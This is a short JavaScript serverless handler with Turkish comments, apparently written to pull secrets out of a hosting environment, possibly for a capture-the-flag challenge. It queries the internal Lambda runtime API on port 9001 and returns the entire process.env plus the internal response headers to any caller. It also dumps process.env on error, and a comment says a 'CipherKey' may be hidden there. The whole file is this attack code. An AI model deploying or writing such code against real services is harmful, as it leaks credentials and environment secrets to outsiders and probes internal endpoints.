export default async function handler(req, res) {
  try {
    // 9001 portundaki gizli servise bir istek atıyoruz
    const internalResponse = await fetch(`http://${process.env.AWS_LAMBDA_METADATA_API}/2018-06-01/runtime/invocation/next`, {
      headers: { 'Lambda-Runtime-Invoker-Batch-Size': '1' }
    });

    res.status(200).json({
      not: "9001 portundan veri cekildi",
      env: process.env,
      // Buraya bak, CipherKey buralarda bir yerde gizli olabilir!
      headers: Object.fromEntries(internalResponse.headers) 
    });
  } catch (error) {
    res.status(200).json({ error: error.message, env: process.env });
  }
}
